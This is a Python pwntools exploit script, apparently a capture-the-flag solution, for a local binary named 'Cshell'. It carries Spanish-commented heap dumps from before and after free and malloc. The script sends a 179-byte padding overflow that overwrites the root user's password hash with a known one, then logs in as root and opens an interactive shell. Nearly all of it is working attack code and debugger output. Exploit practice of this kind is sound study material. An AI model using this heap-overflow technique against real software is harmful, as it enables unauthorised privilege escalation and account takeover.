#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("Cshell")
libc = elf.libc

gs = '''
start
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()

# =============================================================================
# 0x04026F7 -> user malloc after history
# 
# =============================================================================
# root_t	=	0x5186b0	# 0x40
# user_t	=	0x5186e0	# 0x40
# alex_buff	=	0x518710	# 0x40
# charlie_buff	=	0x518760	# 0x50
# johnny_buff	=	0x5187c0	# 0x60
# erick_buff	=	0x518830	# 0x80	
# user

# =============================================================================

# HISTORY: ANTES DE FREE

# 00000000005186b0     0000000000000000 0000000000000000	
# 00000000005186c0     0000000000000000 0000000000000000

# 00000000005186d0     0000000000000000 0000000000000031
# 00000000005186e0     0000000000000000 0000000000000000
# 00000000005186f0     0000000000000000 0000000000000000

# 0000000000518700     0000000000000000 0000000000000051	 "Alex\nJust a user on this system.\0"
# 0000000000518710     73754a0a78656c41 7265737520612074
# 0000000000518720     73696874206e6f20 2e6d657473797320
# 0000000000518730     0000000000000000 0000000000000000
# 0000000000518740     0000000000000000 0000000000000000

# 0000000000518750     0000000000000000 0000000000000061	"Johnny\n Not sure why I am a user on this system.\0"
# 0000000000518760     0a65696c72616843 746f6e206f642049
# 0000000000518770     7420747375727420 7275636573206568
# 0000000000518780     7420666f20797469 676f727020736968
# 0000000000518790     00002e2e2e6d6172 0000000000000000
# 00000000005187a0     0000000000000000 0000000000000000

# 00000000005187b0     0000000000000000 0000000000000071	"Charlie\nI do not trust the security of this program...\0"
# 00000000005187c0     200a796e6e686f4a 6572757320746f4e
# 00000000005187d0     6120492079687720 726573752061206d
# 00000000005187e0     73696874206e6f20 2e6d657473797320
# 00000000005187f0     0000000000000000 0000000000000000
# 0000000000518800     0000000000000000 0000000000000000
# 0000000000518810     0000000000000000 0000000000000000

# 0000000000518820     0000000000000000 0000000000000091	"Eric\nThis is one of the best programs I have ever used!\0"
# 0000000000518830     6968540a63697245 656e6f2073692073
# 0000000000518840     2065687420666f20 6f72702074736562
# 0000000000518850     204920736d617267 6576652065766168
# 0000000000518860     0021646573752072 0000000000000000
# 0000000000518870     0000000000000000 0000000000000000
# 0000000000518880     0000000000000000 0000000000000000
# 0000000000518890     0000000000000000 0000000000000000
# 00000000005188a0     0000000000000000 0000000000000000
# 00000000005188b0     0000000000000000 0000000000020751

# ============================================================================

# HISTORY: DESPUES DEL FREE

# 00000000005186b0     0000000000000000 0000000000000000
# 00000000005186c0     0000000000000000 0000000000000000
# 00000000005186d0     0000000000000000 0000000000000031
# 00000000005186e0     0000000000000000 0000000000000000
# 00000000005186f0     0000000000000000 0000000000000000
# 0000000000518700     0000000000000000 0000000000000051
# 0000000000518710     73754a0a78656c41 7265737520612074
# 0000000000518720     73696874206e6f20 2e6d657473797320
# 0000000000518730     0000000000000000 0000000000000000
# 0000000000518740     0000000000000000 0000000000000000
# 0000000000518750     0000000000000000 0000000000000061	
# 0000000000518760     0000000000000518 0000000000517d90	< --- FREED
# 0000000000518770     7420747375727420 7275636573206568
# 0000000000518780     7420666f20797469 676f727020736968
# 0000000000518790     00002e2e2e6d6172 0000000000000000
# 00000000005187a0     0000000000000000 0000000000000000
# 00000000005187b0     0000000000000000 0000000000000071
# 00000000005187c0     200a796e6e686f4a 6572757320746f4e
# 00000000005187d0     6120492079687720 726573752061206d
# 00000000005187e0     73696874206e6f20 2e6d657473797320
# 00000000005187f0     0000000000000000 0000000000000000
# 0000000000518800     0000000000000000 0000000000000000
# 0000000000518810     0000000000000000 0000000000000000
# 0000000000518820     0000000000000000 0000000000000091	< --- FREED
# 0000000000518830     0000000000000518 0000000000517d90
# 0000000000518840     2065687420666f20 6f72702074736562
# 0000000000518850     204920736d617267 6576652065766168
# 0000000000518860     0021646573752072 0000000000000000
# 0000000000518870     0000000000000000 0000000000000000
# 0000000000518880     0000000000000000 0000000000000000
# 0000000000518890     0000000000000000 0000000000000000
# 00000000005188a0     0000000000000000 0000000000000000
# 00000000005188b0     0000000000000000 0000000000020751

# =============================================================================

# DESPUES DE USER MALLOC

# 00000000005188b0     0000000000000000 00000000000000c1
# 00000000005188c0     0000000000000000 0000000000000000
# 00000000005188d0     0000000000000000 0000000000000000
# 00000000005188e0     0000000000000000 0000000000000000

# ROOT
# 00000000005188db     0000000000000000 0000000000000000
# 00000000005188eb     0000000000000000 0000000000000000
# 00000000005188fb     0000000000000000 0000000000000000
# 000000000051890b     0000000000000000 0000000000000000

# tempname y placehold en user

# 00000000005188b0     0000000000000000 00000000000000c1
# 00000000005188c0     656d616e706d6574 6c6f686563616c70
# 00000000005188d0     0000000000000000 0000000000000000
# 00000000005188e0     0000000000000000 0000000000000000

# root 

# 00000000005188db     0000000000000000 0000000000000000
# 00000000005188eb     00000000746f6f72 3a656d7373657567
# 00000000005188fb     0000000000000029 0000000000000000
# 000000000051890b     0000000000000000 0000000000000000

# root_t->next = user_t;
# pwndbg> dq 0x5186b0-16
# 00000000005186a0     0000000000000000 0000000000000031
# 00000000005186b0     00000000005186e0 00000000005188eb
# 00000000005186c0     00000000746f6f72 0000000000000000
# 00000000005186d0     0000000000000000 0000000000000031


# BBBBBBBB root-passwd (hash)

# 31 33 32 78 6f 31 59 65 72 68 6b 4f 45
# 313332786f315965 72686b4f45
# 3545232824513681765 491378134853

# little endian

# 45 4f 6b 68 72 65 59 31 6f 78 32 33 31
# 454f6b6872655931 6f78323331
# 4994328608117184817 478757925681

io.sendlineafter('>','A'*8)
io.sendlineafter('>','B'*8)
io.sendlineafter('>','128')
padd=b'C'*179
# 132xo1YerhkOE
root = p64(0x746f6f72)
hash_BBBBBBBB = b'\x31\x33\x32\x78\x6f\x31\x59\x65\x72\x68\x6b\x4f\x45'
exploit=padd+root+hash_BBBBBBBB
io.sendlineafter('>',exploit)
io.sendlineafter('>','1')
io.sendlineafter(':','root')
io.sendlineafter(':','BBBBBBBB')
io.sendlineafter('>','3')
# =============================================================================

io.interactive()
